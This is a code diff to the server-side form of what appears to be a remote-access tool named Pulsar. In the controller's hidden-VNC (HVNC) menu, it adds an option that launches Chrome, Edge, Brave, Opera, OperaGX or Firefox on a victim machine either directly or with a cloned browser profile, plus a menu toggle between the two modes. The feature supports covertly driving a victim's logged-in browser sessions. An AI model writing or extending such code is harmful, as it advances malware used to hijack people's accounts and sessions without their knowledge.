@@ -410,7 +410,8 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Path = "Chrome"
+                Path = "Chrome",
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
             });
         }
 
@@ -418,7 +419,8 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Path = "Edge"
+                Path = "Edge",
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
             });
         }
 
@@ -426,7 +428,8 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Path = "Brave"
+                Path = "Brave",
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
             });
         }
 
@@ -434,7 +437,8 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Path = "Opera"
+                Path = "Opera",
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
             });
         }
 
@@ -442,7 +446,8 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Path = "OperaGX"
+                Path = "OperaGX",
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
             });
         }
 
@@ -450,7 +455,8 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Path = "FireFox"
+                Path = "Mozilla",
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
             });
         }
 
@@ -474,6 +480,20 @@ namespace Pulsar.Server.Forms
         {
             FrmCustomFileStarter fileSelectionForm = new FrmCustomFileStarter(_connectClient, typeof(StartHVNCProcess));
             fileSelectionForm.ShowDialog();
+        }
+
+        private void cLONEBROWSERPROFILEToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            cLONEBROWSERPROFILEToolStripMenuItem.Checked = !cLONEBROWSERPROFILEToolStripMenuItem.Checked;
+            
+            if (cLONEBROWSERPROFILEToolStripMenuItem.Checked)
+            {
+                cLONEBROWSERPROFILEToolStripMenuItem.Text = "CLONE BROWSER PROFILE";
+            }
+            else
+            {
+                cLONEBROWSERPROFILEToolStripMenuItem.Text = "DIRECT START BROWSER";
+            }
         }
 
         #endregion
